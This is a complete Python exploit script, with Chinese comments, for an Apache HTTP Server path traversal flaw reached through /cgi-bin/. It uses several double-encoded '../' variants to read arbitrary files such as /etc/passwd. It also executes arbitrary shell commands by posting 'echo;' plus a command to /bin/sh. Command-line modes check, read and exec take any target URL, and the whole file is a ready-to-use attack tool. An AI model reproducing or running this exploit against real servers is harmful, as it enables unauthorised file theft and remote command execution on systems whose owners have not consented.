#!python3
#-*-coding:utf-8-*-

import random, urllib.request, sys, getopt


def myprint(s):
	try:
		print(s.decode())
	except Exception:
		print(s)

headers = {
			'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
			}

strlist = ['.%%32e/', '%%32%65%%32%65/', '.%%32e/', '.%2%65/', '%%32e%%32e/']  #  "../" 的变体


def vulncheck(url, path = '/etc/passwd', cmd = 'id', shell = '/bin/sh'):
	p = random.choice(strlist) * 8		#8个../

	u1 = '{}/cgi-bin/{}{}'.format(url, p, path[1:])			
	u2 = '{}/cgi-bin/{}{}'.format(url, p, shell[1:])		

	data = 'echo;{}'.format(cmd)	
	
	req1 = urllib.request.Request(method = 'GET', url = u1, headers = headers)		#文件读取
	req2 = urllib.request.Request(method = 'GET', url = u2, headers = headers, data = data.encode())	#命令执行

	try:
		res1 = urllib.request.urlopen(req1)
		ret1 = res1.read()
		if res1.status == 200 and len(ret1) > 0:
			myprint('目标存在任意文件读取漏洞:')
			myprint(ret1)
	except Exception as e:
		myprint(e)
		myprint('未发现任意文件读取漏洞')

	try:
		res2 = urllib.request.urlopen(req2)
		ret2 = res2.read()
		if res2.status == 200 and 'uid='.encode() in ret2:
			myprint('目标存在命令执行漏洞:')
			myprint(ret2)
		else:
			myprint('未发现命令执行漏洞')
	except Exception as e:
		myprint(e)
		myprint('未发现命令执行漏洞')


def readfile(url, fpath):

	p = random.choice(strlist) * 8		
	u = '{}/cgi-bin/{}{}'.format(url, p, fpath[1:])	
	req = urllib.request.Request(method = 'GET', url = u, headers = headers)
	try:
		res = urllib.request.urlopen(req)
		ret = res.read()
	except Exception as e:
		ret = e
	myprint(ret)
	return ret


def cmdexec(url, cmd, shell = None):
	shell = shell or '/bin/sh'
	p = random.choice(strlist) * 8		
	u = '{}/cgi-bin/{}{}'.format(url, p, shell[1:])	
	data = 'echo;{}'.format(cmd)
	req = urllib.request.Request(method = 'GET', url = u, headers = headers, data = data.encode())
	try:
		res = urllib.request.urlopen(req)
		ret = res.read()
	except Exception as e:
		ret = e
	myprint(ret)
	return ret

if __name__ == '__main__':
	opts = dict()
	arglist = sys.argv[1:]

	opt, argss = getopt.getopt(arglist, 'u:m:f:c:s:')
	for op in opt:
		opts[op[0]] = op[1]

	url = opts.get('-u')
	if not url:
		myprint('请使用-u指定目标url')
		sys.exit(0)
	mode = opts.get('-m') or 'check'

	if mode == 'check':
		vulncheck(url)
	elif mode == 'read':
		fpath = opts.get('-f')
		if not fpath:
			myprint('请使用-f指定文件路径')
			sys.exit(0)
		readfile(url, fpath)
	elif mode == 'exec':
		shell = opts.get('-s')
		cmd = opts.get('-c')
		if not cmd:
			myprint('请使用-c指定要执行的命令')
			sys.exit(0)
		cmdexec(url, cmd, shell)





